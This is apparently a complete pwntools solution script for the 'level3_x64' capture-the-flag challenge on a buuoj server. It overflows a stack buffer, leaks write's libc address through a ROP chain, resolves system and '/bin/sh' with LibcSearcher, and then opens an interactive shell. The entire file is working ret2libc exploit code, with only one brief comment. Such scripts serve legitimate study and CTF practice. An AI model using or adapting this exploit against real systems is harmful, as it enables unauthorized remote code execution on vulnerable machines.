from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
io = remote('node4.buuoj.cn', 25985)

write_plt = ELF('./level3_x64').plt["write"]
write_got = ELF('./level3_x64').got["write"]
# print(hex(write_plt), hex(write_got))

main_addr = 0x40061a
vulnfunc = 0x4005e6
pop_rdi_ret = 0x4006b3
pop_rsi_r15_ret = 0x4006b1

# 实际上我们并不需要控制第三个参数rdx，因为read()函数执行之前，rdx就已经被置为0x200了，足够输出write_got的内容。
payload1 = b'a'*(0x80+8)+p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(0xdeadcafe)+p64(write_plt)+p64(main_addr)
io.sendlineafter(b'Input:\n', payload1)

write_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
io.success(hex(write_addr))

libc = LibcSearcher("write", write_addr)
offset = write_addr - libc.dump("write")
# io.success(hex(offset))

sys_addr = libc.dump("system") + offset
binsh_addr = libc.dump("str_bin_sh") + offset

payload2 = b'a'*(0x80+8)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(sys_addr)
io.send(payload2)

io.interactive()